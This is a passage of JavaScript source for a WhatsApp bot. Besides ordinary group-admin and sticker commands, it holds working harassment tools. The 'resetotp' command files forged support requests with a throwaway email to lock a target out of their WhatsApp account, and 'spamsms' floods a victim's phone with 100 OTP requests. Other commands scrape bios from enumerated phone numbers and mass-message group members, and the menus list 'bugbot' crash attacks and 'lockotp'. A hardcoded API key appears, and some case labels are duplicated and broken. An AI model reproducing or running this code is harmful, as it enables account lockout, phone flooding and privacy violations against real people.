if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antitoxic) return reply('UDAH ON!')
global.antitoxic = true
reply('Fitur toxic telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antitoxic) return reply('UDAH OFF!')
global.antitoxic = false
reply('Fitur toxic telah di matikan')
} else reply('on / off')
break
case 'antilinkgrup': case 'antilinkgroup':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinkgrup) return reply('UDAH ON!')
global.antilinkgrup = true
reply('Fitur antilinkgrup telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinkgrup) return reply('UDAH OFF!')
global.antilinkgrup = false
reply('Fitur antilinkgrup telah di matikan')
} else reply('on / off')
break
case 'antilinkyt': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinkyt) return reply('UDAH ON!')
global.antilinkyt = true
reply('Fitur antilinkyt telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinkyt) return reply('UDAH OFF!')
global.antilinkyt = false
reply('Fitur antilinkyt telah di matikan')
} else reply('on / off')
break
case 'antilinkig': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinkig) return reply('UDAH ON!')
global.antilinkig = true
reply('Fitur antilinkig telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinkig) return reply('UDAH OFF!')
global.antilinkig = false
reply('Fitur antilinkig telah di matikan')
} else reply('on / off')
break
case 'antilinkfb': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinkfb) return reply('UDAH ON!')
global.antilinkfb = true
reply('Fitur antilinkfb telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinkfb) return reply('UDAH OFF!')
global.antilinkfb = false
reply('Fitur antilinkfb telah di matikan')
} else reply('on / off')
break
case 'antilinkxnxx': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinkxnxx) return reply('UDAH ON!')
global.antilinkxnxx = true
reply('Fitur antilinkxnxx telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinkxnxx) return reply('UDAH OFF!')
global.antilinkxnxx = false
reply('Fitur antilinkxnxx telah di matikan')
} else reply('on / off')
break
case 'antilinktt': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinktt) return reply('UDAH ON!')
global.antilinktt = true
reply('Fitur antilinktt telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinktt) return reply('UDAH OFF!')
global.antilinktt = false
reply('Fitur antilinktt telah di matikan')
} else reply('on / off')
break
case 'antilinktele': case 'antilinkyoutube':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (args[0] == 'on'){
if (global.antilinktele) return reply('UDAH ON!')
global.antilinktele = true
reply('Fitur antilinktele telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilinktele) return reply('UDAH OFF!')
global.antilinktele = false
reply('Fitur antilinktele telah di matikan')
} else reply('on / off')
break
case 'menu': {
let tek = `⟜▢ \`「 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝘽𝙤𝙩 」\` ネ

 Creator : Lyosh
 Version: Beta Test
 Mode : ${conn.public ? 'Public' : 'Self'}
 Prefix : Multi 

╭─▢ *List Menu* ▢─•
│• _cpanel_
│• _jagagrub_
│• _install_
│• _tools_
│• _phuskon_
│• _bugbot_
╰───────▢
`
//await sleep(1000)
//conn.sendMessage(m.chat, {react: {text: "❕", key: m.key}})
 conn.sendMessage(m.chat, {
    text: tek,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `B E T A - B O T`,
        body: `@Lyosh`,
        sourceUrl: "https://whatsapp.com/channel/0029VafDePdDuMRlvpm04k3x",
        thumbnailUrl: thumb,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   }, { quoted: VerifQuoted })
}
break

case 'phuskon': {
ewe4 =  `
            _*P U S H  K O N T A K*_
            
> _Version Text Biasa_
  • ${prefix}pushkontak *text*
  • ${prefix}pushkontak2 *idgc*
  
> _Version Yang Ada Gambar_
  • ${prefix}pushkontak3 *text*
  • ${prefix}pushkontak4 *idgc|pesan*
  • ${prefix}pushkontak5 *idgc|text|button link*
  • ${prefix}pushkontak6 *idgc|text|button biasa*
  • ${prefix}pushkontak7 *idgc|text|button copy*
  • ${prefix}pushkontak8 *idgc|text|button telpon*
  • ${prefix}pushkontak9 *idgc|text|burton list*
  
> _Version Yang Ada Video_
  • ${prefix}pushkontak10 *text*
  • ${prefix}pushkontak11 *idgc|pesan*
  • ${prefix}pushkontak12 *idgc|text|button link*
  • ${prefix}pushkontak13 *idgc|text|button biasa*
  • ${prefix}pushkontak14 *idgc|text|button copy*
  • ${prefix}pushkontak15 *idgc|text|button telpon*
  • ${prefix}pushkontak16 *idgc|text|burton list*
`
reply(ewe4)
}
break
case 'tools':{
ewe176 = `╭─❍   \`TOOLS\` ❍
│
│ ${prefix}lockotp *62|89xxx*
│ ${prefix}spam_pairing *689xxxx|5*
│ ${prefix}jadibot
│ ${prefix}culikmember1 *idgc*
│ ${prefix}culikmember2 *idgc*
│ ${prefix}idgc1
│ ${prefix}idgc2 *url*
╰───•
`
reply(ewe176)
}
break
case 'cpanel':{
ewe = `╭─❍   \`PETRODACTYL\` ❍
│
│ ${prefix}1gb *nama,nomor*
│ ${prefix}2gb *nama,nomor*
│ ${prefix}3gb *nama,nomor*
│ ${prefix}4gb *nama,nomor*
│ ${prefix}5gb *nama,nomor*
│ ${prefix}6gb *nama,nomor*
│ ${prefix}7gb *nama,nomor*
│ ${prefix}8gb *nama,nomor*
│ ${prefix}9gb *nama,nomor*
│ ${prefix}unli *nama,nomor*
╰───•

╭─❍
│ ${prefix}adminpanel *nama,nomor*
│ ${prefix}delusr *ID SERVER*
│ ${prefix}delsrv *ID USER*
│ ${prefix}listusr
│ ${prefix}listsrv
╰───•`
reply(ewe)
}
break
case 'install':{
ewe2 = `╭─❍   \`INSTALLERS\` ❍
│
│ ${prefix}installpanel
│ ${prefix}uinstallpanel
│ ${prefix}startwings
│ ${prefix}-
╰───•
`
reply(ewe2)
}
break
case 'jagagrub': {
ewe3 = `╭─❍   \`Security Grub\` 
│
│ ${prefix}antilinkgrub *on / off*
│ ${prefix}antitoxic *on / off*
│ ${prefix}antilinkyt *on / off*  
│ ${prefix}antilinkfb *on / off*  
│ ${prefix}antilinktt *on / off*  
│ ${prefix}antilinkig *on / off*  
│ 
│ ${prefix}antitoxic *on / off*  
│ 
│ ${prefix}antifoto *on / off*  
│ ${prefix}antiaudio *on / off*  
│ ${prefix}antistiker *on / off*  
│ ${prefix}antivideo *on / off*  
╰───•`
reply(ewe3)
}
break
case 'bugbot':{
ewe5 = `╭─❍   \`BUGBOT\` ❍
│
│ ${prefix}freeze _permanen_
│ ${prefix}bug1  _sementara_
│ ${prefix}bug2  _permanen_
│ ${prefix}buggc _permanen_
╰───•
`
reply(ewe5)
}
break
// TXT MENU
case 'addowner':
if (!isCreator) return reply(global.nocreator)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
murbug.push(bnnd)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
reply(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'dellowner':
if (!isCreator) return reply(global.nocreator)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = murbug.indexOf(yaki)
owner.splice(unp, 1)
murbug.splice(anp, 1)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
reply(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'addprem':
if (!isCreator) return reply(global.nocreator)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return reply(`Enter a valid number and register on WhatsApp!!!`)
murbug.push(bnnd)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
reply(`Number ${bnnd} Has Been Added to Murbug!!!`)
break

case 'delprem':
if (!isCreator) return reply(global.nocreator)
if (!args[0]) return reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = murbug.indexOf(yaki)
murbug.splice(unp, 1)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
reply(`Number ${yaki} Has Been Removed From Murbug!!!`)
break

case 'listuser':
if (!isCreator) return reply(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
conn.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'pushkontak':{
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!qtext) return reply(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
conn.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
reply(`*Successfully sent message To ${mem.length} person*`)
}
break

case 'bcgroup': {
if (!isCreator) return reply(global.nocreator)
if (!qtext) return reply(global.notext)
await loading()
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
reply(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
await loading()
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
case 'kick':{
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
const froms = m.quoted ? m.quoted.sender : qtext ? (qtext.replace(/[^0-9]/g, '') ? qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
if (!froms) return reply(`Tag atau balas pesan orang yang ingin di keluarkan!`)
if (froms == global.owner || froms == botNumber) return reply(`Tidak bisa kick ${froms == global.owner ? 'creator saya' : 'bot'}!`)
var data = await conn.groupParticipantsUpdate(from, [froms], "remove")
for (let ryaa of data) {
if (ryaa.status === '406'){
reply(`Gagal kick member dengan alasan: *Dia yang membuat grup ini*`)
} else {
reply('Sukses kick member')
}
}
}
break
case 'add': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
const froms = m.quoted ? m.quoted.sender : qtext ? (qtext.replace(/[^0-9]/g, '') ? qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
if (!froms) return reply("Balas pesan atau masukan nomor target!")
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
var cek = await conn.onWhatsApp(froms)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
let add = await conn.groupParticipantsUpdate(from, [froms], "add")
Object.entries(add).map(([_, v]) => {
if (v.status === '403'){
reply(`Gagal menambahkan peserta dengan alasan: *Diprivate oleh yang bersangkutan*`)
} else if (v.status === '409'){
reply('Orang yang anda add sudah berada didalam Grup!')
} else if (v.status === '408'){
reply(`Gagal menambahkan peserta dengan alasan: *Dia baru keluar group baru baru ini*`)
} else if (v.status === '401'){
reply(`Gagal menambahkan peserta dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else reply(`Sukses menambahkan member`)
})
}
break

case 'promote': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!qtext) return reply(global.notext)
await loading()
await conn.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!qtext) return reply(global.notext)
await loading()
await conn.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
await loading()
let responsegg = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
await loading()
conn.groupRevokeInvite(from)
break

case 'public': {
if (!isCreator) return reply(global.nocreator)
conn.public = true
reply('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return reply(global.nocreator)
conn.public = false
reply('Sukse Change To Self')
}
break

case 'resetotp': {
if (!isMurbug) return reply(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Insert number!')
}
break

case 'spamsms': {
if (!isMurbug) return reply('*Premium only*')
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY RXHL`);
});
}
} else reply(`Use of spam SMS number/reply target message*\nExample of spam SMS +6281214281312`)
reply(`SMS/call spam will be sent to the target number`)
}
break

case 'sticker':
 if (!quoted) return reply(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return reply(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
break

case 'attp':
if (args.length == 0) return reply(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
conn.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return reply(global.notext)
if (!quoted) throw `Reply to Image With Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
conn.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return reply("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(from, { caption: `Rxhl Official!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect': case 'getidgrup': {
if (!isMurbug) return reply(global.nocreator)
if (!qtext) return reply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
conn.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
reply(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return reply( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return reply("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'startytmp3':{
if (!q) return reply(`Example : ${prefix + command} karna su sayang`)
const rxhlplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await rxhlplay.mp3(anup3k.url)
await conn.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `Rxhl Official`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return reply(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
conn.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return reply('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break

case 'fliptext': {
if (args.length < 1) return reply(`Example:\n${prefix}fliptext rxhl`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return reply(global.nocreator)
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await conn.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Success`)
} else {
var memeg = await conn.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Success`)
}
}
break

case 'nowa': {
if (!isMurbug) return reply(global.nocreator)
if (!q) return reply(`insert Number, example: ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('Enter the suffix x to find the number?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return reply('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
reply('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await conn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await conn.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
reply(hasil)
}
break

case 'tourl': {
if (!isMurbug) return reply(global.nocreator)
if (!quoted) return reply(`Reply Media`)
reply('*please wait a moment*')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await uploadUguu(media)
reply(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await uploadUguu(media)
reply(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await uploadUguu(media)
reply(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case "1gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 1GB"
let egg = global.eggs
let loc = global.loca
let memo = "1048"
let cpu = "200"
let disk = "5091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
